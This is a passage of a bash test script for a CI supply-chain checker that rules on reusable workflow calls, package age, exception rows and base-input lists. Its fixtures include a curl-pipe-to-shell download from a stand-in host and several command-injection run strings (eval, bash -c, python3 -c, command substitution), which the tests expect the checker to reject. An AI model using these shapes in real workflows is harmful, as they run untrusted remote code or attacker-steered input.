(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text().replace('    steps:\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', '    steps:\n      - uses: ./.github/workflows/callee.yml\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', 1))"
lck mstep
CASE="AC19: a STEP that uses a workflow file is not a reusable-workflow call: it stays an item (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/mstep.out"
lcallc m3 ' ./.github/workflows/callee.yml'
printf '%s' "\" ./.github/workflows/callee.yml\"" >"$work/lcall.uses"
newcase m3 "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: \" ./.github/workflows/callee.yml\"\n')"
lck m3
CASE="AC19: a quoted value with a leading space is not the exact form: not exempted (exit 1)"
check test "$rc" -eq 1
printf '%s\n' 'on: workflow_call' >"$work/callee-empty.yml"
lcallc m4 './.github/workflows/callee.yml' '' "$work/callee-empty.yml"
lck m4
CASE="AC19: a callee with no jobs is not a workflow read as one: not exempted (exit 1)"
check test "$rc" -eq 1
printf '%s\n' 'echo harmless' >"$work/callee-scalar.yml"
lcallc m5 './.github/workflows/callee.yml' '' "$work/callee-scalar.yml"
lck m5
CASE="AC19: a callee that is a plain scalar is not a workflow: not exempted (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-notcall.yml" <<EOF
on: push
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
EOF
lcallc m6 './.github/workflows/callee.yml' '' "$work/callee-notcall.yml"
lck m6
CASE="AC19: a callee with no workflow_call trigger cannot be called: not exempted (exit 1)"
check test "$rc" -eq 1
lcallc m7 './.github/workflows/callee.yml' $'    with:\n      mode2: release\n'
lck m7
CASE="AC19: any with: value, whatever it holds, keeps the call an item (exit 1)"
check test "$rc" -eq 1
lcallc m8 './.github/workflows/callee.yml' $'    with:\n      mode: café\n'
lck m8
CASE="AC19: a non-ASCII with: value keeps the call an item (exit 1)"
check test "$rc" -eq 1
lcallc m9 './.github/workflows/callee.yml' $'    with:\n      steps: [one, \'two2\']\n'
lck m9
CASE="AC19: a digit inside a list value keeps the call an item (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-fed.yml" <<EOF
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: \${{ inputs.version }}
EOF
lcallc m10 './.github/workflows/callee.yml' $'    with:\n      version: latest\n' "$work/callee-fed.yml"
lck m10
CASE="AC19: a callee whose installer version comes from an input (an expression in its identity) is not exempted, whatever the caller passes (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-dl.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://example.invalid/tool.sh | sh
EOF
lcallc m11 './.github/workflows/callee.yml' '' "$work/callee-dl.yml"
lck m11
CASE="AC19: a callee with a download this check cannot measure: the call is no item, the callee's own new download fails by its own rule (exit 1)"
check test "$rc" -eq 1
# a call whose with: input changes between base and head, in the quoted-space spelling (the input's identity must move with it)
rm -rf "$work/mchg"; cp -R "$base" "$work/mchg"
( cd "$work/mchg" && python3 - "$work/callee.yml" <<'PY'
import pathlib, subprocess, sys
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(sys.argv[1]).read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: " ./.github/workflows/callee.yml"\n    with:\n      pin: v1.0.0\n')
subprocess.run(["git", "add", "-A"], check=True)
subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "base2"], check=True)
c.write_text(c.read_text().replace("v1.0.0", "v9.9.9"))
subprocess.run(["git", "add", "-A"], check=True)
subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "head2"], check=True)
PY
)
lck mchg
CASE="AC19: changing a version input of a local call (quoted with a leading space) moves the call's identity: exit 1, not 0"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/mchg.out"

# AC20: the line identity
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/mix-base.sh"
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' '# pip install fixture' >"$work/mix-head.sh"
rm -rf "$work/mix"; cp -R "$base" "$work/mix"
( cd "$work/mix" && cp "$work/mix-base.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b2 && cp "$work/mix-head.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h2 )
pkck mix ok bin/mix-test.sh "# pip install fixture"
CASE="AC20: a ruled comment line does not rule the UNCHANGED install line whose assignment changed: exit 1"
check test "$rc" -eq 1
newcase pkscan "
import pathlib
f = pathlib.Path('bin/install-scanner.sh')
f.write_text(f.read_text() + 'echo \"fixture pip install requests\"\n')"
pkck pkscan ok bin/install-scanner.sh 'echo "fixture pip install requests"'
CASE="AC20: the same ruled line in bin/install-scanner.sh passes like in any script (exit 0)"
check test "$rc" -eq 0
pkck pkscan none bin/install-scanner.sh 'echo "fixture pip install requests"'
CASE="AC20: without its row the line in bin/install-scanner.sh fails (exit 1)"
check test "$rc" -eq 1
# the advisory audit judges the same line once: with a row it is not an advisory hit, without it it is (exit 1)
audfx() {  # REPO OUT: a fixtures file with an advisory against the repo's unpinned requests item
  python3 - "$work/$1" "$2" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[3]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
k = [k for k in inv.load_at(sys.argv[1], None) if k.startswith("package:pypi/requests@(unpinned)")]
assert len(k) == 1, k
json.dump({"lists": {k[0]: {"github": [{"id": "GHSA-test-test-test", "incident": "INC-T", "affected": True, "modified": "2026-09-01T00:00:00Z"}], "osv": []}},
           "upstream": {}, "prs": []}, open(sys.argv[2], "w"))
PY
}
audck() {  # REPO EXCEPTIONS -> rc
  rc=0; python3 "$here/../supply-chain/pin-audit.py" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/aud.fx.json" --exceptions "$2" --now "$NOW" --gh /bin/true >"$work/aud.out" 2>&1 || rc=$?
}
audfx pk "$work/aud.fx.json"
audck pk "$work/pk-pk-ok.json"
CASE="AC20: pin-audit (the second command of the required job) does not report a ruled script line's package as an advisory hit (exit 0)"
check test "$rc" -eq 0
audck pk "$work/pk-pk-none.json"
CASE="AC20: with no row the same package IS an advisory hit in pin-audit (exit 1): the ruling is what changes it"
check test "$rc" -eq 1; check grep -q 'HIT' "$work/aud.out"
# AC3: a fractional second never makes a time earlier (age short of 7 days is young)
CASE="AC3: a publish time 0.5 s short of seven days before now is too young (the fraction rounds up)"
check python3 - "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
class I: kind="package"; name="pypi/x"; version="1.0.0"; label=""; path=""
now = dt.datetime(2026, 10, 14, 12, 0, 0, tzinfo=dt.timezone.utc)
ok, why, _ = ac.judge_item(I(), [("2026-10-07T12:00:00.500Z", "pypi")], now)
assert not ok, why
ok, why, _ = ac.judge_item(I(), [("2026-10-07T12:00:00Z", "pypi")], now)
assert ok, why
PY

CASE="AC3: an action named by a TAG (v1.2.3), not by its commit, has no age even with an old clock for it: not ok, and nothing is looked up"
check python3 - "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
class I: kind="action"; name="o/r"; version="v1.2.3"; label=""; path=""
now = dt.datetime(2026, 10, 14, 12, 0, 0, tzinfo=dt.timezone.utc)
ok, why, _ = ac.judge_item(I(), [("2026-09-01T00:00:00Z", "first-seen")], now)
assert not ok, why
assert ac.live_proofs(I(), "/nonexistent") == []
PY

# --- round 2 of the review of PR 329: state between calls, a relay, a self-call, an identical copy, a fractional clock -------------------------------------
cat >"$work/callee2.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@$SHA5 # v4.2.0
EOF
newcase two "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
(w / 'callee2.yml').write_text(pathlib.Path(r'$work/callee2.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n  c2:\n    uses: ./.github/workflows/callee2.yml\n')"
lck two
CASE="AC19: two different plain callees in one tree are BOTH exempted: no state of the first judgement leaks into the second (exit 0)"
check test "$rc" -eq 0; check bash -c "! grep -q 'action:local:' '$work/two.out'"
# the second call already in the base, the first added in the head: the unchanged second must not move
rm -rf "$work/two2"; cp -R "$base" "$work/two2"
( cd "$work/two2" && python3 - "$work" <<'PY'
import pathlib, subprocess, sys
work = sys.argv[1]
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(work + '/callee.yml').read_text())
(w / 'callee2.yml').write_text(pathlib.Path(work + '/callee2.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c2:\n    uses: ./.github/workflows/callee2.yml\n')
g = lambda *a: subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True)
g("add", "-A"); g("commit", "-qm", "b")
c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n')
g("add", "-A"); g("commit", "-qm", "h")
PY
)
lck two2
CASE="AC19: adding one exempt call beside an unchanged one moves nothing (exit 0): the unchanged call keeps its exemption"
check test "$rc" -eq 0
# a relay: caller -> relay -> leaf, the relay forwarding an input to an installer version in the leaf
cat >"$work/leaf.yml" <<EOF
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  i:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: \${{ inputs.version }}
EOF
cat >"$work/relay.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  forward:
    uses: ./.github/workflows/leaf.yml
    with:
      version: ${{ inputs.version }}
EOF
newcase relay "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'leaf.yml').write_text(pathlib.Path(r'$work/leaf.yml').read_text())
(w / 'relay.yml').write_text(pathlib.Path(r'$work/relay.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/relay.yml\n    with:\n      version: latest\n')"
lck relay
CASE="AC19: a relay that forwards an input to another local workflow is not exempted (a version could be steered through it): the call stays an item (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:./.github/workflows/relay.yml' "$work/relay.out"
printf 'on: workflow_call\njobs:\n  j:\n    uses: ./.github/workflows/selfcall.yml\n' >"$work/selfcall.yml"
newcase selfc "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'selfcall.yml').write_text(pathlib.Path(r'$work/selfcall.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/selfcall.yml\n')"
lck selfc
CASE="AC19: a workflow that calls itself terminates (no crash); with no with: the call is no item and nothing else moved (exit 0)"
check test "$rc" -eq 0; check bash -c "! grep -qi 'traceback\|recursion' '$work/selfc.out'"
# AC20: an identical copy added beside an unchanged install line whose assignment changed
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/cp-base.sh"
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' 'pip install "$DEPS"' >"$work/cp-head.sh"
rm -rf "$work/cp"; cp -R "$base" "$work/cp"
( cd "$work/cp" && cp "$work/cp-base.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b3 && cp "$work/cp-head.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h3 )
pkrows "$work/pk-cp.json" count2 bin/cp-test.sh 'pip install "$DEPS"'
rc=0; python3 "$chk" --root "$work/cp" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/pk-cp.json" >"$work/cp.out" 2>&1 || rc=$?
CASE="AC20: an identical copy of a line the base already holds is never ruled away with the unchanged one whose assignment moved (exit 1)"
check test "$rc" -eq 1
audfx cp "$work/aud-cp.fx.json" 2>/dev/null || true
# AC3: a fractional measurement clock is truncated, a fractional publication time rounded up
CASE="AC3: now = ...:00.500Z against a publication at ...:01Z is NOT seven full days (publication rounds up, the clock down): too young"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
class I: kind="package"; name="pypi/x"; version="1.0.0"; label=""; path=""
now = ac.parse_time("2026-10-14T12:00:00.500Z", True)
ok, why, _ = ac.judge_item(I(), [("2026-10-07T12:00:01Z", "pypi")], now)
assert not ok, why
ok, why, _ = ac.judge_item(I(), [("2026-10-07T12:00:00Z", "pypi")], now)
assert ok, why
PY

# the opaque installer input: a version selected by a FILE the caller names (round 3 of the review of PR 329)
cat >"$work/callee-file.yml" <<EOF
on:
  workflow_call:
    inputs:
      file:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version-file: \${{ inputs.file }}
EOF
lcallc m12 './.github/workflows/callee.yml' $'    with:\n      file: stable.txt\n' "$work/callee-file.yml"
lck m12
CASE="AC19: a callee that hands a caller input to an installer through an input nobody classified (python-version-file) is not exempted (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:./.github/workflows/callee.yml' "$work/m12.out"

# round 4 of the review: an input may appear in a callee only in an if:, a name:, or an env: value handed to a script as a quoted argument
cat >"$work/callee-uses.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${{ inputs.version }}
EOF
lcallc m14 './.github/workflows/callee.yml' $'    with:\n      version: stable\n' "$work/callee-uses.yml"
lck m14
CASE="AC19: an input in a remote uses: reference (which the inventory cannot read) keeps the call an item whatever the caller passes (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:./.github/workflows/callee.yml' "$work/m14.out"
cat >"$work/callee-goenv.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      suffix:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOOL_SUFFIX: ${{ inputs.suffix }}
        run: go install github.com/example/tool@v1.0.0`printenv TOOL_SUFFIX`
EOF
lcallc m15 './.github/workflows/callee.yml' $'    with:\n      suffix: -alpha\n' "$work/callee-goenv.yml"
lck m15
CASE="AC19: an input handed through env to an installer command in the same step keeps the call an item (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-envarg.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      mode:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - name: the mode is release or snapshot
        if: ${{ inputs.mode == 'release' }}
        env:
          MODE: ${{ inputs.mode }}
        run: bash bin/refuse-mode.sh "$MODE"
EOF
lcallc m16 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-envarg.yml"
lck m16
CASE="AC19: even the quiet shape (an if: and a quoted env argument) keeps the call an item once the caller passes a with: value (exit 1)"
check test "$rc" -eq 1

# round 5 of the review: the step that receives an input through env must be nothing but a literal script invocation
mkcallee() { # NAME 'run text' -> $work/NAME.yml: a callee with one step handing inputs.x to env X and running the text
  printf 'on:\n  workflow_call:\n    inputs:\n      x:\n        type: string\njobs:\n  k:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          X: ${{ inputs.x }}\n          CLIENT: npm\n        run: %s\n' "$2" >"$work/$1.yml"
}
n=0
for run in '"$CLIENT" install "$X"' 'eval "$X"' 'bash -c "$X"' 'bash bin/s.sh "$X" | sh' 'bash bin/s.sh $(echo "$X")' 'bash bin/s.sh "$X" && "$CLIENT" install "$X"' 'bash ../s.sh "$X"' 'python3 -c "$X"' 'sh "$X"'; do
  n=$((n+1)); mkcallee "envbad$n" "$run" ; python3 - "$work/envbad$n.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("run: ", "run: '", 1).rstrip("\n").replace("\n  ", "\n  ")
open(sys.argv[1], "w").write(t + "'\n")
PY
  lcallc "me$n" './.github/workflows/callee.yml' $'    with:\n      x: lodash@latest\n' "$work/envbad$n.yml"
  lck "me$n"
  CASE="AC19: a step that hands an input to env and runs [$run] is not a literal script invocation: the call stays an item (exit 1)"
  check test "$rc" -eq 1
done

# --- the closed form (orchestrator, Oct 14): a with-bearing local call is ruled by a base-branch row bound to its identity ---------------------------------
printf '%s\n' "on: workflow_call" "jobs:" "  k:" "    runs-on: ubuntu-latest" "    steps:" "      - uses: actions/checkout@$SHA1 # v4.1.0" >"$work/callee-w.yml"
lcallc w1 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-w.yml"
lck w1
CASE="AC19 closed form: a call with a with: block is an item that cannot pass (exit 1)"
check test "$rc" -eq 1
lcallc w2 './.github/workflows/callee.yml' $'    with: {}\n' "$work/callee-w.yml"
lck w2
CASE="AC19 closed form: an EMPTY with: block is no with: (exit 0)"
check test "$rc" -eq 0
# lcrow OUT MODE REPO: a row built from the real inventory of REPO's head, the hash computed here from the item's whole key
lcrow() {
  python3 - "$1" "$2" "$work/$3" "$here/../supply-chain/pin-inventory.py" <<'PY'
import hashlib, importlib.util, json, sys
out, mode, repo, invp = sys.argv[1:5]
spec = importlib.util.spec_from_file_location("inv", invp); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
head = inv.load_at(repo, "HEAD"); base = inv.load_at(repo, "HEAD~1")
keys = [k for k in head if k not in base and "(local)" in k]
assert len(keys) == 1, keys
h = hashlib.sha256(keys[0].encode()).hexdigest()
row = {"file": ".github/workflows/ci.yml", "form": "a local reusable workflow call", "key": h, "line": h,
       "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"}
if mode == "wrongfile": row["file"] = ".github/workflows/other.yml"
elif mode == "wrongform": row["form"] = "a download"
elif mode == "wronghash": row["key"] = row["line"] = ("0" if h[0] != "0" else "1") + h[1:]
elif mode != "ok": raise SystemExit(mode)
json.dump({"_format": "t", "exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
PY
}
lcrow "$work/lc-ok.json" ok w1
rc=0; python3 "$chk" --root "$work/w1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/lc-ok.json" >"$work/w1r.out" 2>&1 || rc=$?
CASE="AC19 closed form: a base-branch row naming the call's file and whole identity rules it: exit 0, reported as ruled text with the ruling"
check test "$rc" -eq 0; check grep -q 'advisor ruling Oct 14' "$work/w1r.out"
for m in wrongfile wrongform wronghash; do
  lcrow "$work/lc-$m.json" $m w1
  rc=0; python3 "$chk" --root "$work/w1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/lc-$m.json" >"$work/w1r.out" 2>&1 || rc=$?
  CASE="AC19 closed form: a row with the $m does not rule the call (exit 1)"
  check test "$rc" -eq 1
done
lcallc w3 './.github/workflows/callee.yml' $'    with:\n      mode: debug\n' "$work/callee-w.yml"
rc=0; python3 "$chk" --root "$work/w3" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/lc-ok.json" >"$work/w3r.out" 2>&1 || rc=$?
CASE="AC19 closed form: editing the with: block voids the row (the identity carries the block's hash): exit 1"
check test "$rc" -eq 1

# round 6 of the review: a padded reference is a different identity, so the row of the exact call never rules it
for pad in '" ./.github/workflows/callee.yml"' '"./.github/workflows/callee.yml "'; do
  printf '%s' "$pad" >"$work/lcall.uses"
  printf '%s' $'    with:\n      mode: release\n' >"$work/lcall.with"
  n="pad$(printf '%s' "$pad" | cksum | cut -d' ' -f1)"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee-w.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ' + pathlib.Path(r'$work/lcall.uses').read_text() + '\n    with:\n      mode: release\n')"
  rc=0; python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/lc-ok.json" >"$work/$n.out" 2>&1 || rc=$?
  CASE="AC19: the exact call's row does not rule the padded spelling $pad of the same call (exit 1)"
  check test "$rc" -eq 1
done

# round 8 of the review (both seats): an identity digest is never truncated; brute-forced 32-bit and 40-bit collision pairs stay two items
CASE="AC19: two local references (expressions) and two with: blocks that collided under the old 32-bit and 40-bit digests are four different identities, and swapping one for the other MOVES an item"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
a, b = "./.github/workflows/${{ inputs.v81708 }}.yml", "./.github/workflows/${{ inputs.v83546 }}.yml"
assert inv._local_name(a) != inv._local_name(b)
assert len(inv._local_name(a).split("~")[1]) == 64
def tree(uses, with_):
    return {".github/workflows/a.yml": "jobs:\n  c:\n    uses: '%s'\n    with:\n      mode: %s\n" % (uses, with_)}
k1 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value98725")))
k2 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value793926")))
assert k1 != k2 and all(len(k.split("#with:")[1]) == 64 for k in k1 | k2 if "#with:" in k), (k1, k2)
j1, j2 = set(inv.inventory(tree(a, "x"))), set(inv.inventory(tree(b, "x")))
assert j1 != j2
PY

# identity digests are the full sha256; a call row must resolve to exactly one item of a tree (the assertion the review asked for)
CASE="full sha256: a local-call row resolves to exactly one item of the tree it names, a row with a wrong hash resolves to none"
check python3 - "$chk" "$work/w1" "$work/lc-ok.json" "$work/lc-wronghash.json" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert ac.unresolved_call_rows(sys.argv[2], "HEAD", sys.argv[3]) == []
bad = ac.unresolved_call_rows(sys.argv[2], "HEAD", sys.argv[4])
assert len(bad) == 1, bad
# a correct key with a wrong line rules nothing, so it is unresolved (the consumer looks up (file, form, h, h))
import json, copy
d = json.load(open(sys.argv[3])); r = d["unmeasured_text"][0]; r["line"] = ("0" if r["line"][0] != "0" else "1") * 64
import tempfile
with tempfile.NamedTemporaryFile("w", suffix=".json") as f:
    f.write(json.dumps(d)); f.flush()
    assert len(ac.unresolved_call_rows(sys.argv[2], "HEAD", f.name)) == 1
PY
CASE="full sha256: every committed local-call row is a 64-hex key equal to its line, and a ruling that starts with the call phrase"
check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
import json, re, sys
for r in json.load(open(sys.argv[1]))["unmeasured_text"]:
    if r["form"] == "a local reusable workflow call":
        assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["ruling"].startswith("local reusable workflow call; "), r
PY

CASE="full sha256: the collision pairs both seats reproduced under the old 32-48 bit tags (a checksum set, a step tag of an expression, a default-installer step) are different identities"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def keys(files): return set(inv.inventory(files))
# a step tag: the same go install with two different input expressions
w = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: go install example.com/tool@${{ inputs.%s }}\n" % v}
assert keys(w("v205063")) != keys(w("v1326818"))
# a checksum set: the same release download with two different 64-hex checksums that collided under the 32-bit tag
c = lambda s: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          curl -fsSL https://github.com/o/r/releases/download/v1.0.0/x.tgz -o x.tgz\n          echo '%s  x.tgz' | sha256sum -c -\n" % s.rjust(64, "0")}
assert keys(c("7158")) != keys(c("1f235"))
# a default-installer step: two steps differing only outside with/uses
d = lambda n: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/setup-python@%s # v6.1.0\n        name: collision-%s\n" % ("4" * 40, n)}
assert keys(d("8189")) != keys(d("89291"))
for k in keys(c("7158")) | keys(w("v205063")):
    tag = k.split("#", 1)[1] if "#" in k else ""
    if tag.startswith(("step:", "default:")):
        assert len(tag.split(":")[-1]) == 64, k
PY

# --- REQ-SUP-001-AC21: a file named by .github/policy/base-inputs.json is no item (orchestrator Oct 14: the plainest closed form, no pattern on names) ---------------
# The list is read from the base branch's copy beside the script (CI: trusted/), or --base-inputs FILE; a file listed there is the repository's own base record
# (its content change is the chain's base-input-changed signal). A missing list exempts nothing; a malformed one stops the check (exit 2).
printf '%s\n' "sha256:aaaa  x" >"$work/bi-keys.sha256"
newcase bi "
import pathlib
p = pathlib.Path('build/locks'); p.mkdir(parents=True, exist_ok=True)
(p / 'archive-keys.sha256').write_text('wolfi-signing.rsa.pub sha256:' + 'a' * 64 + '\\n')
(p / 'archive-index.sha256').write_text('x86_64 sha256:' + 'b' * 64 + '\\n')"
bick() { # LISTFILE-or-empty [extra] -> rc, $work/bi.out
  local lf=$1; shift; rc=0
  if [ -n "$lf" ]; then python3 "$chk" --root "$work/bi" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --base-inputs "$lf" "$@" >"$work/bi.out" 2>&1 || rc=$?
  else python3 "$chk" --root "$work/bi" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" "$@" >"$work/bi.out" 2>&1 || rc=$?; fi
}
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256"]}' >"$work/bi-ok.json"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-one.json"
printf '%s' '{"base_inputs": ["build/locks/other.sha256", "./build/locks/archive-keys.sha256", "build/locks/../locks/archive-keys.sha256"]}' >"$work/bi-near.json"
printf '%s' '{"base_inputs": "build/locks/archive-keys.sha256"}' >"$work/bi-str.json"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", 7]}' >"$work/bi-int.json"
printf '%s' '{"base_inputs": [], "base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-dup.json"
printf '%s' 'not json' >"$work/bi-bad.json"
bick ""
CASE="AC21: with no list, two new checksum record files are items that cannot pass (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi.out")" -eq 2
bick "$work/bi-ok.json"
CASE="AC21: a list naming both files exempts both: exit 0, each reported as a base input"
check test "$rc" -eq 0; check test "$(grep -c 'base input' "$work/bi.out")" -eq 2
bick "$work/bi-one.json"
CASE="AC21: a list naming one exempts exactly that one: the other still fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi.out")" -eq 1; check grep -q 'archive-index' "$work/bi.out"
bick "$work/bi-near.json"
CASE="AC21: near spellings (another name, ./ prefix, .. inside) exempt nothing: exact path equality only (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi.out")" -eq 2
for f in bi-str bi-int bi-dup bi-bad; do
  bick "$work/$f.json"
  CASE="AC21: a malformed list ($f) stops the check, never 'nothing exempted' and never 'everything' (exit 2)"
  check test "$rc" -eq 2
done
# a pull request's own list is never read: the default is the copy beside the script, not the tree under --root
rm -rf "$work/bi2"; cp -R "$work/bi" "$work/bi2"
( cd "$work/bi2" && mkdir -p .github/policy && cp "$work/bi-ok.json" .github/policy/base-inputs.json && git add -A && git -c user.name=t -c user.email=t@x commit -qm list )
rc=0; python3 "$chk" --root "$work/bi2" --base HEAD~2 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/bi2.out" 2>&1 || rc=$?
CASE="AC21: a list the pull request itself adds under --root exempts nothing (the default list is the base branch's copy beside the script): exit 1"
check test "$rc" -eq 1
CASE="AC21: only a checksum or version FILE item can be exempted: a download of the same path text from a workflow stays an item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
class I:  # a tool item that is NOT a (file) item although its name mentions the path
    kind = "tool"; name = "o/r/build/locks/archive-keys.sha256"; version = "v1.0.0"; src = None; raw = None; key = "tool:o/r/build/locks/archive-keys.sha256@v1.0.0"
class F:
    kind = "tool"; name = "file:build/locks/archive-keys.sha256"; version = "(file)"; src = None; raw = "build/locks/archive-keys.sha256"
    key = "tool:file:build/locks/archive-keys.sha256@(file)#content:x"
kept, ruled = ac.split_base_inputs([I(), F()], {"build/locks/archive-keys.sha256"})
assert [m.name for m in kept] == [I.name] and [m.name for m in ruled] == [F.name], (kept, ruled)
PY

# round 1 of the review of PR 340 (both seats): the exact path is the one git names, not the display name; and the day-7 rerun applies the same decision
